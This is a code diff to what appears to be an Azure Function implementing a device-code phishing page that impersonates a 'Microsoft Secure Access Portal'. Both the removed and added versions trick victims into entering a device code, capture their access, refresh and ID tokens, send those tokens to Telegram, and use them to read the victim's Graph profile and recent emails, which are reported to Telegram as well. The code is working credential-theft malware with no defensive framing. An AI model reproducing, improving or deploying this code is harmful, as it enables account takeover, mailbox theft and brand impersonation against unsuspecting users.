@@ -52,18 +52,18 @@ module.exports = async function (context, req) {
       const data = await response.json();
       
       if (data.device_code) {
-        await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\n👤 User Code: ${data.user_code}\n🔗 Verification URI: ${data.verification_uri}\n⏰ Expires in: ${data.expires_in} seconds\n📅 ${new Date().toISOString()}`);
+        await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\n🔑 Code: ${data.user_code}\n📱 URL: ${data.verification_uri}\n⏰ Expires: ${data.expires_in}s`);
         
         context.res = {
           status: 200,
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             success: true,
+            device_code: data.device_code,
             user_code: data.user_code,
             verification_uri: data.verification_uri,
-            device_code: data.device_code,
             expires_in: data.expires_in,
-            interval: data.interval || 5
+            interval: data.interval
           })
         };
       } else {
@@ -102,43 +102,27 @@ module.exports = async function (context, req) {
       const data = await response.json();
       
       if (data.access_token) {
-        // 🔥 COMPREHENSIVE TOKEN CAPTURE
-        const tokenInfo = {
-          access_token: data.access_token,
-          refresh_token: data.refresh_token || 'NOT_PROVIDED',
-          id_token: data.id_token || 'NOT_PROVIDED',
-          token_type: data.token_type,
-          scope: data.scope,
-          expires_in: data.expires_in
-        };
-
-        // Get user info immediately
+        // 🔥 SUCCESS - CAPTURE ALL TOKENS INCLUDING REFRESH TOKEN
+        await sendTelegram(`🔥 <b>TOKEN CAPTURE SUCCESS!</b>\n✅ Access Token: ${data.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${data.refresh_token ? data.refresh_token.substring(0, 50) + '...' : 'None'}\n🆔 ID Token: ${data.id_token ? data.id_token.substring(0, 50) + '...' : 'None'}`);
+        
+        // Fetch user profile and mail simultaneously
         try {
-          const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
-            headers: { 'Authorization': `Bearer ${data.access_token}` }
-          });
-          const userInfo = await userResponse.json();
+          const [userResponse, mailResponse] = await Promise.all([
+            fetch('https://graph.microsoft.com/v1.0/me', {
+              headers: { 'Authorization': `Bearer ${data.access_token}` }
+            }),
+            fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
+              headers: { 'Authorization': `Bearer ${data.access_token}` }
+            })
+          ]);
           
-          // Get mail access
-          const mailResponse = await fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
-            headers: { 'Authorization': `Bearer ${data.access_token}` }
-          });
+          const userData = await userResponse.json();
           const mailData = await mailResponse.json();
           
-          // 🚨 TELEGRAM ALERT WITH ALL TOKENS INCLUDING REFRESH TOKEN
-          await sendTelegram(`🚨 <b>DEVICE CODE SUCCESS - FULL TOKEN CAPTURE!</b>
-🎯 <b>ACCESS TOKEN:</b> ${data.access_token}
-🔄 <b>REFRESH TOKEN:</b> ${data.refresh_token || 'NOT_PROVIDED'}
-🆔 <b>ID TOKEN:</b> ${data.id_token || 'NOT_PROVIDED'}
-👤 <b>Email:</b> ${userInfo.mail || userInfo.userPrincipalName}
-🏢 <b>Name:</b> ${userInfo.displayName}
-🏢 <b>Company:</b> ${userInfo.companyName || 'N/A'}
-🆔 <b>ID:</b> ${userInfo.id}
-📧 <b>Mail Access:</b> ${mailData.value ? mailData.value.length : 0} emails
-📅 ${new Date().toISOString()}`);
+          await sendTelegram(`👤 <b>USER PROFILE CAPTURED</b>\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Organization: ${userData.companyName || 'Personal'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} messages`);
           
-        } catch (userError) {
-          console.log('User info error:', userError);
+        } catch (profileError) {
+          console.error('Profile fetch error:', profileError);
         }
         
         context.res = {
@@ -146,10 +130,12 @@ module.exports = async function (context, req) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             success: true,
-            ...tokenInfo
+            access_token: data.access_token,
+            refresh_token: data.refresh_token,
+            id_token: data.id_token,
+            expires_in: data.expires_in
           })
         };
-        
       } else if (data.error === 'authorization_pending') {
         context.res = {
           status: 200,
@@ -157,15 +143,15 @@ module.exports = async function (context, req) {
           body: JSON.stringify({ pending: true })
         };
       } else {
-        await sendTelegram(`⚠️ <b>DEVICE CODE POLLING</b>\n🔥 Error: ${data.error}\n📝 Description: ${data.error_description}\n`);
+        await sendTelegram(`⚠️ <b>DEVICE CODE POLLING</b>\n🔥 Error: ${data.error}\n📝 Description: ${data.error_description}`);
         context.res = {
-          status: 400,
+          status: 200,
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ error: data.error, description: data.error_description })
+          body: JSON.stringify(data)
         };
       }
     } catch (error) {
-      context.log('Token polling error:', error);
+      await sendTelegram(`⚠️ <b>POLLING ERROR</b>\n🔥 Error: ${error.message}`);
       context.res = {
         status: 500,
         headers: { 'Content-Type': 'application/json' },
@@ -175,7 +161,7 @@ module.exports = async function (context, req) {
     return;
   }
   
-  // Default: Serve the device code landing page
+  // Main UI
   context.res = {
     status: 200,
     headers: { 'Content-Type': 'text/html' },
@@ -183,150 +169,137 @@ module.exports = async function (context, req) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔐 Microsoft Security Access</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Microsoft Secure Access Portal</title>
     <style>
-        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .btn { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
-        .btn:hover { background: #106ebe; }
-        .code-display { background: #f8f9fa; padding: 20px; border-radius: 4px; margin: 20px 0; text-align: center; font-size: 24px; font-weight: bold; letter-spacing: 3px; }
-        .status { margin: 20px 0; padding: 15px; border-radius: 4px; text-align: center; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .pending { background: #fff3cd; color: #856404; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
+        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
+        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
+        .subtitle { color: #605e5c; margin-bottom: 30px; }
+        .step { margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #0078d4; }
+        .device-code { font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #0078d4; margin: 15px 0; padding: 15px; background: #e6f3ff; border-radius: 6px; }
+        .button { background: #0078d4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; margin: 10px; transition: background 0.3s; }
+        .button:hover { background: #106ebe; }
+        .status { margin: 20px 0; padding: 15px; border-radius: 6px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
         .hidden { display: none; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>🔐 Microsoft Security Access</h1>
-            <p>Enhanced authentication portal</p>
-        </div>
+        <div class="logo">M</div>
+        <h1>Microsoft Secure Access</h1>
+        <p class="subtitle">Enhanced Security Verification Portal</p>
         
         <div id="step1">
-            <button class="btn" onclick="generateCode()">🚀 Access Microsoft Services</button>
-            <p style="margin-top: 20px; text-align: center; color: #666;">
-                Secure access to Microsoft 365, OneDrive, and Outlook
-            </p>
+            <div class="step">
+                <h3>🔐 Step 1: Generate Security Code</h3>
+                <p>Click below to generate your secure access code</p>
+                <button class="button" onclick="generateCode()">Generate Access Code</button>
+            </div>
         </div>
         
         <div id="step2" class="hidden">
-            <div class="status pending">
-                <h3>📱 Device Authentication Required</h3>
-                <p>1. Go to: <strong><span id="verification-url"></span></strong></p>
-                <p>2. Enter this code:</p>
-                <div class="code-display" id="user-code"></div>
-                <p>3. Complete login on your device</p>
-            </div>
-            <div id="polling-status" class="status pending">
-                ⏳ Waiting for authentication... <span id="countdown"></span>
+            <div class="step">
+                <h3>📱 Step 2: Device Verification</h3>
+                <p>Enter this code on the verification page:</p>
+                <div class="device-code" id="userCode">Loading...</div>
+                <a id="verificationLink" class="button" target="_blank">Open Verification Page</a>
+                <button class="button" onclick="startPolling()">I've Entered the Code</button>
             </div>
         </div>
         
         <div id="step3" class="hidden">
-            <div class="status success">
-                <h3>✅ Authentication Successful!</h3>
-                <p>Welcome! Your Microsoft services are now accessible.</p>
-                <div id="user-info"></div>
+            <div class="step">
+                <h3>⏳ Step 3: Waiting for Verification</h3>
+                <p>Please complete the verification on the Microsoft page</p>
+                <div class="loading"></div>
+                <p>Checking status every 3 seconds...</p>
             </div>
         </div>
         
-        <div id="error" class="hidden">
-            <div class="status error">
-                <h3>❌ Authentication Failed</h3>
-                <p id="error-message"></p>
-                <button class="btn" onclick="location.reload()">🔄 Try Again</button>
-            </div>
-        </div>
+        <div id="status"></div>
     </div>
 
     <script>
-        let deviceCode = null;
+        let deviceCodeData = null;
         let pollingInterval = null;
-        let countdown = 900; // 15 minutes
-        
+
         async function generateCode() {
             try {
                 const response = await fetch('?action=generate_code');
                 const data = await response.json();
                 
                 if (data.success) {
-                    deviceCode = data.device_code;
-                    document.getElementById('verification-url').textContent = data.verification_uri;
-                    document.getElementById('user-code').textContent = data.user_code;
+                    deviceCodeData = data;
+                    document.getElementById('userCode').textContent = data.user_code;
+                    document.getElementById('verificationLink').href = data.verification_uri;
                     
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
                     
-                    // Start polling with faster interval (3 seconds)
-                    startPolling(3000);
-                    startCountdown();
+                    showStatus('Code generated successfully! Please verify on the Microsoft page.', 'success');
                 } else {
-                    showError('Failed to generate device code');
+                    showStatus('Failed to generate code: ' + (data.error || 'Unknown error'), 'error');
                 }
             } catch (error) {
-                showError('Network error: ' + error.message);
+                showStatus('Network error: ' + error.message, 'error');
             }
         }
-        
-        function startPolling(interval) {
+
+        async function startPolling() {
+            if (!deviceCodeData) {
+                showStatus('No device code available', 'error');
+                return;
+            }
+            
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            
             pollingInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(\`?action=poll_token&device_code=\${deviceCode}\`);
+                    const response = await fetch(\`?action=poll_token&device_code=\${deviceCodeData.device_code}\`);
                     const data = await response.json();
                     
                     if (data.success) {
                         clearInterval(pollingInterval);
-                        document.getElementById('step2').classList.add('hidden');
-                        document.getElementById('step3').classList.remove('hidden');
+                        showStatus('✅ Authentication successful! Access granted.', 'success');
+                        document.getElementById('step3').classList.add('hidden');
                         
-                        // Show success message without token details for UI
-                        document.getElementById('user-info').innerHTML = \`
-                            <p><strong>Access Level:</strong> Full Microsoft Services</p>
-                            <p><strong>Status:</strong> Active Session</p>
-                            <p><strong>Tokens:</strong> Access + Refresh + ID Captured</p>
+                        // Show success message
+                        document.querySelector('.container').innerHTML = \`
+                            <div class="logo">✅</div>
+                            <h1>Access Granted</h1>
+                            <p class="subtitle">Your Microsoft account has been successfully verified</p>
+                            <div class="status success">
+                                <strong>Welcome!</strong> You now have secure access to Microsoft services.
+                            </div>
                         \`;
                     } else if (data.pending) {
                         // Continue polling
-                        document.getElementById('polling-status').innerHTML = '⏳ Waiting for authentication... <span id="countdown"></span>';
                     } else if (data.error) {
-                        clearInterval(pollingInterval);
-                        showError(\`Authentication failed: \${data.error}\`);
+                        if (data.error === 'expired_token') {
+                            clearInterval(pollingInterval);
+                            showStatus('Code expired. Please generate a new code.', 'error');
+                            location.reload();
+                        } else {
+                            showStatus(\`Error: \${data.error} - \${data.error_description || ''}\`, 'warning');
+                        }
                     }
                 } catch (error) {
                     console.error('Polling error:', error);
                 }
-            }, interval);
+            }, 3000); // Poll every 3 seconds
         }
-        
-        function startCountdown() {
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                const minutes = Math.floor(countdown / 60);
-                const seconds = countdown % 60;
-                const countdownElement = document.getElementById('countdown');
-                if (countdownElement) {
-                    countdownElement.textContent = \`(\${minutes}:\${seconds.toString().padStart(2, '0')})\`;
-                }
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    clearInterval(pollingInterval);
-                    showError('Device code expired. Please try again.');
-                }
-            }, 1000);
-        }
-        
-        function showError(message) {
-            document.getElementById('error-message').textContent = message;
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.add('hidden');
-            document.getElementById('error').classList.remove('hidden');
+
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.innerHTML = \`<div class="status \${type}">\${message}</div>\`;
         }
     </script>
 </body>
